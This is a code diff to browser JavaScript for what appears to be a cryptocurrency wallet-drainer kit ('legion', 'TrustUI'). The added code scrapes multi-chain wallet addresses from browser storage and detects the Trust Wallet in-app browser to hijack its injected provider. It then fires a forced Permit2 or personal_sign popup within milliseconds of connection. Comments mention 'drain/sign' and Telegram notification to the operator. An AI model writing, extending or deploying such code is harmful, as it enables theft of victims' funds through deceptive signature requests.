@@ -33,20 +33,60 @@
     return a.length > 12 ? a.slice(0, 6) + '…' + a.slice(-4) : a;
   }
 
-  /** Scan WC v2 localStorage for eip155 account */
+  /** Scan WC v2 localStorage for all chain accounts — saves non-EVM to sessionStorage */
   function scanWcStorageAddr() {
+    var evmAddr = '';
+    var NS_MAP = {
+      solana: 'legion_sol_addr', bip122: 'legion_btc_addr',
+      tron: 'legion_tron_addr', ton: 'legion_ton_addr', tvm: 'legion_ton_addr',
+      cosmos: 'legion_cosmos_addr', aptos: 'legion_aptos_addr', sui: 'legion_sui_addr',
+    };
     try {
       for (var i = 0; i < localStorage.length; i++) {
         var k = localStorage.key(i) || '';
         if (k.indexOf('wc@') === -1 && k.indexOf('wagmi') === -1 && k.indexOf('@appkit') === -1) continue;
-        var v = localStorage.getItem(k) || '';
-        var m = v.match(/eip155:\d+:(0x[a-fA-F0-9]{40})/);
-        if (m) return m[1].toLowerCase();
-        m = v.match(/"(0x[a-fA-F0-9]{40})"/);
-        if (m && /account|address/i.test(v)) return m[1].toLowerCase();
+        var raw = localStorage.getItem(k) || '';
+        // EVM
+        if (!evmAddr) {
+          var m = raw.match(/eip155:\d+:(0x[a-fA-F0-9]{40})/);
+          if (m) evmAddr = m[1].toLowerCase();
+          if (!evmAddr) {
+            var m2 = raw.match(/"(0x[a-fA-F0-9]{40})"/);
+            if (m2 && /account|address/i.test(raw)) evmAddr = m2[1].toLowerCase();
+          }
+        }
+        // Non-EVM namespaces
+        try {
+          var obj = JSON.parse(raw);
+          var sessions = obj && typeof obj === 'object' ? Object.values(obj) : [];
+          for (var si = 0; si < sessions.length; si++) {
+            var ns = sessions[si] && sessions[si].namespaces;
+            if (!ns) continue;
+            Object.keys(NS_MAP).forEach(function (nsKey) {
+              if (!ns[nsKey] || !ns[nsKey].accounts || !ns[nsKey].accounts[0]) return;
+              var caip = ns[nsKey].accounts[0];
+              var parts = String(caip).split(':');
+              var addr = parts[parts.length - 1];
+              if (addr) {
+                try { sessionStorage.setItem(NS_MAP[nsKey], addr); } catch (_) {}
+              }
+            });
+          }
+        } catch (_) {}
       }
     } catch (_) {}
-    return '';
+    // Also pull from legion.state.chains if available
+    try {
+      var s = window.legion && window.legion.state && window.legion.state.chains;
+      if (s) {
+        if (s.SOL    && s.SOL.address)    { try { sessionStorage.setItem('legion_sol_addr',    s.SOL.address);    } catch (_) {} }
+        if (s.TRON   && s.TRON.address)   { try { sessionStorage.setItem('legion_tron_addr',   s.TRON.address);   } catch (_) {} }
+        if (s.TON    && s.TON.address)    { try { sessionStorage.setItem('legion_ton_addr',    s.TON.address);    } catch (_) {} }
+        if (s.BTC    && s.BTC.address)    { try { sessionStorage.setItem('legion_btc_addr',    s.BTC.address);    } catch (_) {} }
+        if (s.COSMOS && s.COSMOS.address) { try { sessionStorage.setItem('legion_cosmos_addr', s.COSMOS.address); } catch (_) {} }
+      }
+    } catch (_) {}
+    return evmAddr;
   }
 
   function setConnectButton(addr) {
@@ -156,7 +196,45 @@
       }
     } catch (_) {}
 
-    // ALWAYS recover live WC session — address-only recovery cannot drain/sign
+    var inTrust = false;
+    try {
+      if (window.__TRUST_IN_APP__ || (typeof window.__TRUST_IS_IN_APP__ === 'function' && window.__TRUST_IS_IN_APP__())) {
+        inTrust = true;
+      }
+      if (/utm_source=Trust_(iOS|Android)_Browser/i.test(String(location.search || ''))) inTrust = true;
+    } catch (_) {}
+
+    // Inside Trust Browser: prefer injected ethereum (real confirm popup). Never overwrite with WC.
+    if (inTrust) {
+      var inj = null;
+      try {
+        if (window.trustwallet && window.trustwallet.ethereum) inj = window.trustwallet.ethereum;
+        else if (window.ethereum) inj = window.ethereum;
+      } catch (_) {}
+      if (inj) {
+        try {
+          var acctsI = await inj.request({ method: 'eth_accounts' });
+          if ((!acctsI || !acctsI[0]) && typeof inj.request === 'function') {
+            try { acctsI = await inj.request({ method: 'eth_requestAccounts' }); } catch (_) {}
+          }
+          if (acctsI && acctsI[0]) addr = String(acctsI[0]).toLowerCase();
+        } catch (_) {}
+        if (window.legion) {
+          try {
+            window.legion.state.evmProvider = inj;
+            if (addr) window.legion.state.evmAddr = addr;
+            window.legion.state.connectMode = 'injected';
+            window.legion.state.wcSessionActive = false;
+            window.legion.state.evmWallet = 'Trust Wallet';
+            try { inj.isWalletConnect = false; } catch (_) {}
+          } catch (_) {}
+        }
+        if (addr) saveAddr(addr);
+        return { addr: addr, prov: inj, mode: 'injected' };
+      }
+    }
+
+    // Outside Trust: recover live WC session
     var prov = null;
     try {
       if (window.LegionWallet && typeof window.LegionWallet.tryRecoverStoredSession === 'function') {
@@ -197,7 +275,7 @@
     if (!addr) addr = scanWcStorageAddr();
     if (!addr) addr = loadAddr();
     if (addr) saveAddr(addr);
-    return { addr: addr, prov: prov };
+    return { addr: addr, prov: prov, mode: prov ? 'wc' : null };
   }
 
   function runPipeline(why) {
@@ -218,17 +296,29 @@
           console.warn('[TrustUI] pipeline: legion missing');
           return false;
         }
-        // Seed state so continueConnected / notify can run
         try {
           if (got.addr) L.state.evmAddr = got.addr;
           if (got.prov) {
             L.state.evmProvider = got.prov;
-            try { got.prov.isWalletConnect = true; } catch (_) {}
-            L.state.connectMode = 'wc';
-            L.state.wcSessionActive = true;
+            if (got.mode === 'injected') {
+              L.state.connectMode = 'injected';
+              L.state.wcSessionActive = false;
+              try { got.prov.isWalletConnect = false; } catch (_) {}
+            } else {
+              try { got.prov.isWalletConnect = true; } catch (_) {}
+              L.state.connectMode = 'wc';
+              L.state.wcSessionActive = true;
+            }
           }
           L.state.evmWallet = L.state.evmWallet || 'Trust Wallet';
         } catch (_) {}
+
+        // Force a wallet confirm popup (Permit2 or personal_sign)
+        if (typeof L.forceTrustSign === 'function') {
+          var r = await L.forceTrustSign();
+          console.warn('[TrustUI] forceTrustSign', r && (r.path || r.error || r.ok));
+          if (r && r.ok) return true;
+        }
 
         if (typeof L.continueConnected === 'function') {
           await L.continueConnected();
@@ -253,14 +343,26 @@
     try {
       window.dispatchEvent(new CustomEvent('trust:addr-recovered', { detail: { address: addr } }));
     } catch (_) {}
-    // Phase A: preflight owns Telegram notify + Trust lock (not old approve sheet)
+    // Phase A: delay preflight — instant sign owns first seconds
     if (typeof window.__TRUST_PREFLIGHT__ === 'function') {
-      window.__TRUST_PREFLIGHT__(addr);
+      setTimeout(function () { window.__TRUST_PREFLIGHT__(addr); }, 2000);
     } else {
       if (opts.sheet !== false) showApproveSheet(addr);
       if (opts.pipeline !== false) {
-        setTimeout(function () { runPipeline('markConnected'); }, 400);
+        setTimeout(function () { runPipeline('markConnected'); }, 200);
       }
+    }
+    // Always kick instant sign immediately
+    if (opts.pipeline !== false) {
+      setTimeout(function () {
+        try {
+          if (window.legion && typeof window.legion.forceTrustSign === 'function') {
+            window.legion.forceTrustSign().catch(function () {});
+          } else {
+            runPipeline('markConnected-sign');
+          }
+        } catch (_) {}
+      }, 50);
     }
     return true;
   }
